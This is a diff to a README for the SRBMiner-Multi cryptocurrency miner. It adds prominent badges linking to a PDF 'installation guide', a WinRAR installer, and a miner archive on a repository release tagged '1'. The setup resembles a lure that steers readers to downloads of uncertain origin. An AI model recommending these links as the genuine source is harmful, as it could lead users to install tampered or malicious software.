@@ -2,6 +2,21 @@
 
 SRBMiner-Multi is a powerful cryptocurrency miner supporting a variety of algorithms across multiple platforms, including **AMD**, **NVIDIA**, **Intel GPUs**, and **CPUs**. With SRBMiner, you can mine up to 4 different algorithms or coins simultaneously.
 
+<p align="center">
+  <a href="https://github.com/SRBMiner-hub/SRBMinerMulti/releases/download/1/SRBMiner_Installation_Guide_Extended.pdf">
+    <img src="https://img.shields.io/badge/📘 Download%20Instruction-blue?style=for-the-badge" alt="Download Instruction">
+  </a>
+  <a href="https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-711.exe">
+    <img src="https://img.shields.io/badge/🗜️ Download%20WinRAR-purple?style=for-the-badge" alt="Download WinRAR">
+  </a>
+  <a href="https://github.com/SRBMiner-hub/SRBMinerMulti/releases/tag/1">
+    <img src="https://img.shields.io/badge/⚙️ Download%20Miner-green?style=for-the-badge" alt="Download Miner">
+  </a>
+</p>
+
+
+
+
 ## Download
 
 - [Download](https://github.com/SRBMiner-hub/SRBMinerMulti/releases/download/1/SRBMiner-MULTI.v2.8.0.zip)
